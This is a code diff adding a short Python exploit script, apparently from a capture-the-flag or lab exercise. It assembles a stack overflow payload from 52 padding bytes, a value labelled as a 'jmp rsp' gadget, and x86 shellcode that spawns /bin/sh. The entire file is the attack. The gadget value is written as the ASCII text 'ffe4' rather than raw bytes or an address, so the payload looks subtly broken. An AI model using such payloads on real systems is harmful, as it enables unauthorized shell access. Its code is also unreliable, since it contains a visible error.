@@ -1,0 +1,11 @@
+
+init = b'a' * 52
+jmprsp = b'ffe4'
+
+buf =  b""
+buf += b"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f"
+buf += b"\x62\x69\x6e\x89\xe3\xcd\x80"
+
+fp = init + jmprsp + buf
+
+print(fp)
